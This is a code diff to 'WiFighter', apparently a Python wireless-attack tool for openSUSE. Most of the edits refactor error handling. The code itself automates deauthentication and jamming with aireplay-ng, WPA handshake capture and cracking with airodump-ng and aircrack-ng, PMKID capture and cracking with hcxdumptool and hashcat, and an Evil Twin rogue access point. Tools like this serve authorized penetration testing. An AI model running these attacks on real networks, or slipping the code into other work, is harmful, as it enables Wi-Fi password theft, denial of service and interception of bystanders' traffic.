@@ -1,4 +1,4 @@
-#!/home/filip/Coding/WiFighter/venv/bin/python3
+#!
 
 # | IMPORT | #
 
@@ -83,7 +83,7 @@ def show_help():
      help_text = """
 Usage: sudo wifighter [OPTION] [ARGUMENT]
 
-WiFighter Tool for OpenSUSE | developed by Filip Struhar https://github.com/FilipStruhar
+Wifi Security Tool for OpenSUSE | developed by Filip Struhar https://github.com/FilipStruhar
 
 Options:
   wifighter                   Runs the tool.
@@ -92,10 +92,10 @@ Options:
   -i, --list                  Show detected wireless interfaces.
   -s, --status <interface>    Show status (Managed or Monitor) of the specified wireless interface.
   -u, --start <interface>     Put the wireless interface into monitor mode and stop interfering services.
-     -l <channel>, --listen <channel>  Also set interface to listen on a specified channel.
+       -l <channel>, --listen <channel>   Set interface to listen on a specified channel.
   -d, --stop <interface>      Put the wireless interface back into managed mode and restart interfering services.
-  -k, --kill                  Stop interfering services (NetworkManager, wpa_supplicant, avahi-daemon).
-  -w, --wake                  Start interfering services back on (NetworkManager, wpa_supplicant, avahi-daemon).
+  -k, --kill                  Stop interfering services (NetworkManager, wpa_supplicant).
+  -w, --wake                  Start interfering services back on (NetworkManager, wpa_supplicant).
 
 Note: This tool must be run with sudo!
 """
@@ -106,11 +106,17 @@ def create_cap_dir(target, output_dir):
      if target:
           if not os.path.exists(output_dir):
                print(f"{CYAN}[>]{RESET} Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
-               os.system(f'mkdir -p {output_dir}')
+               try:
+                    os.system(f'mkdir -p {output_dir}')
+               except:
+                    print(f"{RED}Error running mkdir -p {output_dir}{RESET}")
 
 def create_dir(path):
      if not os.path.exists(path):
-          os.system(f'mkdir -p {path}')
+          try:
+               os.system(f'mkdir -p {path}')
+          except:
+               print(f"{RED}Error running mkdir -p {path}{RESET}")
 
 # Determine handshake capture file
 def list_files(directory): 
@@ -223,9 +229,10 @@ def monitor_switch(verbose, command, interface, channel):
                if channel: 
                     if verbose:
                          print(f"{CYAN}Setting {interface} to listen on channel {channel}...{RESET}")
-                    result = subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], capture_output=True, text=True)
-                    if result.returncode != 0:  # Check if set channel returned error
-                         print(f'{RED} Error setting interface to channel "{channel}". Check prompted channel number!{RESET}')
+                    try:
+                         subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}Error running iw dev ... set channel: {e}{RESET}")
 
           elif command == "start":
                if verbose:
@@ -596,7 +603,7 @@ def scan_ap(interface):
           auth_match = re.search(auth_pattern, ap)
           cipher_match = re.search(cipher_pattern, ap)
           
-          # Extract AP properties or set to None if not found
+          # Extract AP information or set to None if not found
           ssid = ssid_match.group(1).strip() if ssid_match else None
           bssid = bssid_match.group(1).strip() if bssid_match else None
           signal = f'{round(float(signal_match.group(1).strip()))}' if signal_match else None
@@ -608,9 +615,9 @@ def scan_ap(interface):
           # Handle case where ssid isn't properly read, bytes captured instead
           if ssid:
                if "\\x00\\x00\\x00\\" in ssid:
-                    ssid = '--- BYTES ---'
+                    ssid = None
                
-          # Map frequency to band (e.g., 2.4 GHz or 5 GHz)
+          # Map frequency to band (2.4 GHz or 5 GHz)
           band = None
           if frequency:
                if frequency < 3000:
@@ -807,11 +814,14 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      # Run airodump-ng
      def run_airodump(interface, bssid, channel, output_dir):
           if interface and bssid and channel and output_dir:
-               try:
-                    command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
-                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-               except:
-                    pass
+                    try:
+                         command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
+                         subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                    except KeyboardInterrupt:
+                         return
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}Error running airodump-ng: {e}{RESET}")
+                         return
 
      # Run aireplay-ng
      def run_aireplay(interface, bssid, target_client, deauth_mode):
@@ -819,20 +829,24 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                if deauth_mode == "client deauth":
                     if target_client:
                          try:
+                              # Continuosly deauth deauth all clients
                               command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', target_client, interface]
-                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
-                         except:
+                              subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         except KeyboardInterrupt:
                               pass
+                         except subprocess.CalledProcessError as e:
+                              print(f"{RED}Error running aireplay-ng: {e}{RESET}")
+
                elif deauth_mode == "broadcast":
                     try:
+                         # Continuosly deauth deauth all clients
                          command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
-                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                         print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
-                    except:
+                         subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                    except KeyboardInterrupt:
                          pass
-               else:
-                    pass
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}Error running aireplay-ng: {e}{RESET}")
+
 
      logo()
      print(f'{CYAN}| Handshake Crack |{RESET}\n')
@@ -863,10 +877,11 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
      files_before = list_files(output_dir) # Get files before airodump-ng adds new
 
+     print(f"{CYAN}[>]{RESET} Starting airodump-ng")
      # Listen for handshake
      capture_handshake.start() # Start airodump-ng process
      delete_capture = True
-     time.sleep(2)
+     time.sleep(5) # Wait for the airodump to fully start
 
      # Deauth client/s if selected
      if deauth_mode != 'silent':
@@ -883,16 +898,24 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
           start_time = time.time() # Start deauth timer
      while not captured:
           if os.path.exists(f"{output_dir}/{output_file}"):
+               output = None
                try:
-                    command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
-                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                    output = str(verify.communicate())
-               except:
+                    try:
+                         command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
+                         verify = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+                         output = verify.stdout
+                    except KeyboardInterrupt:
+                         pass
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}Error running aircrack-ng: {e}{RESET}")
+                    
+                    if output:
+                         if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
+                              print(f"{CYAN}[>]{RESET} Handshake/s captured!")
+                              captured = True
+                              delete_capture = False
+               except KeyboardInterrupt:
                     pass
-               if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
-                    print(f"{CYAN}[>]{RESET} Handshake/s captured!")
-                    captured = True
-                    delete_capture = False
 
           # Periodically deauth                    
           if deauth_mode != 'silent':
@@ -916,24 +939,31 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      
      # Try cracking the password
      if wordlist:
+          output = None
           try:
-               print(f"{CYAN}[>]{RESET} Cracking handshake with aircrack-ng (CPU) using {wordlist}")
-               command = ['sudo', 'aircrack-ng', '-w', f'{wifighter_path}/wordlists/{wordlist}', f'{output_dir}/{output_file}']
-               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-               output = str(crack.communicate())
+               try:
+                    print(f"{CYAN}[>]{RESET} Cracking handshake with aircrack-ng (CPU) using {wordlist}")
+                    command = ['sudo', 'aircrack-ng', '-w', f'{wifighter_path}/wordlists/{wordlist}', f'{output_dir}/{output_file}']
+                    crack = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+                    output = crack.stdout
+               except KeyboardInterrupt:
+                    pass
+               except subprocess.CalledProcessError as e:
+                    print(f"{RED}Error running aircrack-ng: {e}{RESET}")
 
-               if 'KEY FOUND!' in output:
-                    password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
-                    password_match = re.search(password_pattern, output) # Search for the pattern in the output string
+               if output:
+                    if 'KEY FOUND!' in output:
+                         password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
+                         password_match = re.search(password_pattern, output) # Search for the pattern in the output string
 
-                    # Extract and print the key if found
-                    if password_match:
-                         password = password_match.group(1)
-                         print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
-                         generate_report('Handshake Crack', target_ap, password, target, output_dir)
+                         # Extract and print the key if found
+                         if password_match:
+                              password = password_match.group(1)
+                              print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
+                              generate_report('Handshake Crack', target_ap, password, target, output_dir)
           except KeyboardInterrupt:
                pass
-     
+
      if not password or not wordlist:
           print(f"\n{CYAN}[>]{RESET} Password not found...")
           print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking (use aircrack-ng/hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
@@ -959,10 +989,11 @@ def pmkid_attack(target_ap, interface, target):
           if interface and bssid and channel and output_dir:
                try:
                     command = ['sudo', 'hcxdumptool', '-o', f'{output_dir}/pmkid_capture.pcapng', '-i', interface, '-c', channel, '--enable_status=3', '--filtermode=2', f'--filterlist_ap={bssid}']
-                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-               except:
-                    pass
-
+                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+               except KeyboardInterrupt:
+                    return
+               except subprocess.CalledProcessError as e:
+                    print(f"{RED}Error running hcxdumptool: {e}{RESET}")
 
      logo()
      print(f'{CYAN}| PMKID Attack |{RESET}\n')
@@ -1004,27 +1035,32 @@ def pmkid_attack(target_ap, interface, target):
      print(f"{CYAN}[>]{RESET} Waiting for PMKID...")
      while not captured:
           if os.path.exists(f"{output_dir}/{output_file}"):
+               output = None
                try:
-                    # !! If no EAPOLs caught no pmkid_hash file will be created !!
-                    if file_num:
-                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
-                    else:
-                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
-                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                    output = str(verify.communicate())
-                    print(output)
-               except:
-                    pass
-               # Extract the caught PMKID's number value
-               pmkid_pattern = r'RSN PMKID written to 22000 hash file.....:\s+(\d+)'
-               pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
-               if pmkid_match:
-                    pmkid = pmkid_match.group(1)
-                    if int(pmkid) > 0:
-                         print(f"{CYAN}[>]{RESET} PMKID captured!")
-                         captured = True
-                         delete_capture = False
+                    try:
+                         if file_num:
+                              command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
+                         else:
+                              command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
+                         verify = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+                         output = verify.stdout
+                    except KeyboardInterrupt:
+                         pass
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}Error running hcxpcapngtool: {e}{RESET}")
 
+                    if output:
+                         # Extract the caught PMKID's number value
+                         pmkid_pattern = r'RSN PMKID written to 22000 hash file.....:\s+(\d+)'
+                         pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
+                         if pmkid_match:
+                              pmkid = pmkid_match.group(1)
+                              if int(pmkid) > 0:
+                                   print(f"{CYAN}[>]{RESET} PMKID captured!")
+                                   captured = True
+                                   delete_capture = False
+               except KeyboardInterrupt:
+                    pass
           time.sleep(4)
           
      # Kill hcxdumptool process
@@ -1037,32 +1073,39 @@ def pmkid_attack(target_ap, interface, target):
      
      # Try cracking the password
      if wordlist:
+          output = None
           try:
                print(f"{CYAN}[>]{RESET} Cracking PMKID with hashcat (CPU) using {wordlist}")
-               if file_num:
-                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
-               else:
-                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
-               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-               output = str(crack.communicate())
+               try:
+                    if file_num:
+                         command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
+                    else:
+                         command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
+                    crack = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+                    output = crack.stdout
+               except KeyboardInterrupt:
+                   pass
+               except subprocess.CalledProcessError as e:
+                    print(f"{RED}Error running hashcat: {e}{RESET}")
 
-               # Extract and print the password if found
-               status_pattern = r'Status\.+:\s*(\w+)'
-               status_match = re.search(status_pattern, output) # Search for the pattern in the output string
-               if status_match:
-                    status = status_match.group(1)
-                    if status == 'Cracked':
-                         # Read the password from the cracked output file
-                         if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt') or os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
-                              if file_num:
-                                   cracked_output = f'{output_dir}/pmkid_cracked-{file_num}.txt'
-                              else:
-                                   cracked_output = f'{output_dir}/pmkid_cracked.txt'
-                              with open(cracked_output, "r", encoding="utf-8") as file:
-                                   content = file.read()
-                                   password = content.split(':')[-1].strip()
-                                   print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
-                                   generate_report('PMKID Attack', target_ap, password, target, output_dir)
+               if output:
+                    # Extract and print the password if found
+                    status_pattern = r'Status\.+:\s*(\w+)'
+                    status_match = re.search(status_pattern, output) # Search for the pattern in the output string
+                    if status_match:
+                         status = status_match.group(1)
+                         if status == 'Cracked':
+                              # Read the password from the cracked output file
+                              if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt') or os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
+                                   if file_num:
+                                        cracked_output = f'{output_dir}/pmkid_cracked-{file_num}.txt'
+                                   else:
+                                        cracked_output = f'{output_dir}/pmkid_cracked.txt'
+                                   with open(cracked_output, "r", encoding="utf-8") as file:
+                                        content = file.read()
+                                        password = content.split(':')[-1].strip()
+                                        print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
+                                        generate_report('PMKID Attack', target_ap, password, target, output_dir)
           except KeyboardInterrupt:
                pass
      
@@ -1119,22 +1162,24 @@ def jam_network(target_ap, interface, jammer_mode):
                if jammer_mode == "client jamming":
                     if target_client:
                          try:
-                              # Continuosly deauth client
+                              # Continuosly deauth deauth all clients
                               command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', target_client, interface]
-                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                         except:
+                              subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         except KeyboardInterrupt:
                               pass
+                         except subprocess.CalledProcessError as e:
+                              print(f"{RED}\nError running aireplay-ng: {e}{RESET}")
                     else:
                          print(f'{RED}No target client set! Skipping...{RESET}')
                elif jammer_mode == "broadcast jamming":
                     try:
                          # Continuosly deauth deauth all clients
                          command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
-                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
+                         subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                    except KeyboardInterrupt:
                          pass
-               else:
-                    pass
+                    except subprocess.CalledProcessError as e:
+                         print(f"{RED}\nError running aireplay-ng: {e}{RESET}")
 
           loading.terminate() # End the loading animation
      
@@ -1203,10 +1248,18 @@ def evil_twin(target_ap, twin_mode):
                return evil_interface, internet_interface
 
      def check_internet(internet_interface):
+          result = None
           print(f'\n{CYAN}[>]{RESET} Testing internet connectivity of "{internet_interface}"')
           try:
                # Ping google.com
-               result = subprocess.run(["ping", "-c", "4", "-I", f"{internet_interface}", 'google.com'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+               result = subprocess.run(["ping", "-c", "4", "-I", f"{internet_interface}", 'google.com'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+          except KeyboardInterrupt:
+               return False
+          except subprocess.CalledProcessError as e:
+               print(f"{RED}Error running ping: {e}{RESET}")
+               return False
+
+          if result:
                # Check if "bytes from" or "Reply from" appears in the output
                if "bytes from" in result.stdout or "Reply from" in result.stdout:
                     print(f'{CYAN}[>]{RESET} Internet connection on "{internet_interface}" available\n')
@@ -1214,9 +1267,6 @@ def evil_twin(target_ap, twin_mode):
                else:
                     print(f'{RED}No internet connection on "{internet_interface}"{RESET}\n')
                     return False
-          except Exception as e:
-               print(f"{RED}Error running ping: {e}{RESET}")
-               return False
 
      def is_wireless(interface):
           detected_interfaces = list_interfaces(None)
@@ -1238,12 +1288,16 @@ def evil_twin(target_ap, twin_mode):
                print(f"\n{YELLOW}!! WPA3 protected networks can't be jammed !! Switching to Silent mode...{RESET}")
                jamming_mode = False
 
+          result = None
           try:
                # Get available interface names, exclude "lo"
                result = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, check=True)
-               detected_interfaces = [iface for iface in re.findall(r'^\d+: ([^:]+):', result.stdout, re.MULTILINE) if iface != "lo"]
+          except KeyboardInterrupt:
+               pass
           except subprocess.CalledProcessError as e:
                print(f"{RED}Error executing 'ip -o link show': {e}{RESET}")
+          if result:
+               detected_interfaces = [iface for iface in re.findall(r'^\d+: ([^:]+):', result.stdout, re.MULTILINE) if iface != "lo"]
 
           if detected_interfaces:
                # Make needed interface count is available
@@ -1282,7 +1336,7 @@ def evil_twin(target_ap, twin_mode):
                          
                          # Prompt the user for Evil Twin AP password (can be blank - no password)
                          while True:
-                              password = str(input('Enter password for Evil Twin Wifi network [8+ characters] (Leave blank input for Open Wifi network): '))
+                              password = str(input('Enter password for Evil Twin Wifi network [8 - 63 characters] (Leave blank for Open Network): '))
                               # Make sure chosen password meets the requirements for WPA2
                               if password:
                                    if len(password) >= 8 and 63 >= len(password):
@@ -1309,19 +1363,23 @@ def evil_twin(target_ap, twin_mode):
 
                # Function for running commands
                def run_command(command):
+                    signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                     try:
                          subprocess.run(command, shell=True, check=True)
                     except subprocess.CalledProcessError as e:
                          print(f"{RED}Error running command: {e}{RESET}")
+                    signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user
 
                def run_aireplay(interface, bssid):
                     if interface and bssid:
                          try:
                               # Continuosly deauth deauth all clients
                               command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
-                              subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                         except:
+                              subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         except KeyboardInterrupt:
                               pass
+                         except subprocess.CalledProcessError as e:
+                              print(f"{RED}Error running aireplay-ng: {e}{RESET}")
 
                # Setup DHCP server
                dhcpd_config_file = "/etc/sysconfig/dhcpd"
@@ -1402,7 +1460,6 @@ macaddr_acl=0
                          """))
                print(f'{CYAN}[>]{RESET} Hostapd configuration set')
 
-               signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
                # Add static IP on Evil AP's interface
                run_command(f"sudo ip addr add 192.168.100.1/24 dev {evil_interface}")
                print(f'{CYAN}[>]{RESET} Evil Twin AP interface {evil_interface} configured')
@@ -1422,18 +1479,15 @@ macaddr_acl=0
                # Start dhcp server
                print(f'{CYAN}[>]{RESET} Starting DHCP server for Evil Twin clients\n')
                run_command("sudo systemctl restart dhcpd")
-               signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
 
                if jamming_mode:
                     jam_network = multiprocessing.Process(target = run_aireplay, args=(jamming_interface, bssid))
-                    signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
                     run_command(f"sudo nmcli dev set {jamming_interface} managed no") # Stop the NetworkManager from interfering
                     # Set the jamming interface in monitor mode and target AP channel
                     run_command(f"sudo ip link set {jamming_interface} down")
                     run_command(f"sudo iw dev {jamming_interface} set type monitor")
                     run_command(f"sudo ip link set {jamming_interface} up") 
                     run_command(f"sudo iw dev {jamming_interface} set channel {channel}")
-                    signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
                     jam_network.start() # Start the jammer
                     print(f'{CYAN}[>]{RESET} Jammer on "{ssid}" started')
                
@@ -1447,7 +1501,6 @@ macaddr_acl=0
                # Run the Evil Twin AP
                run_command("sudo hostapd /etc/hostapd.conf")
                
-               signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                # Restore everything
                print(f'\n{CYAN}[>]{RESET} Restoring interfaces and network configuration')
                if jamming_mode:
@@ -1465,7 +1518,6 @@ macaddr_acl=0
                run_command(f"sudo nmcli dev set {evil_interface} managed yes")
                if jamming_mode:
                     run_command(f"sudo nmcli dev set {jamming_interface} managed yes")
-               signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
      else:
           print(f"{RED}\nTarget AP doesn't have SSID set!{RESET}")
           return
